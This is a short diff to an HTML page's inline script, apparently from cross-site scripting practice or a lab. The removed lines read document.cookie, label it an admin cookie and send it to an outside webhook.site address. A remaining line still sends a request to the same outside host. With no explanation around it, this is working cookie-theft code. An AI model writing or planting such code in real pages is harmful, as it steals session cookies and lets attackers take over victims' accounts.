@@ -6,17 +6,7 @@
   <script>
     // Perform GET request using JavaScript
     fetch("https://webhook.site/8686ec85-a03a-4b07-86cd-d08b64fca700/testing");
-    var xhr = new XMLHttpRequest();
-     var admincookie = document.cookie;
-     var url="https://webhook.site/8686ec85-a03a-4b07-86cd-d08b64fca700?param="+admincookie;
-    xhr.open('GET', url, true);
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState === 4 && xhr.status === 200) {
-        console.log(xhr.responseText);
-        // Perform actions with the response data here
-      }
-    };
-    xhr.send();
+    
   </script>
 </head>
 <body>
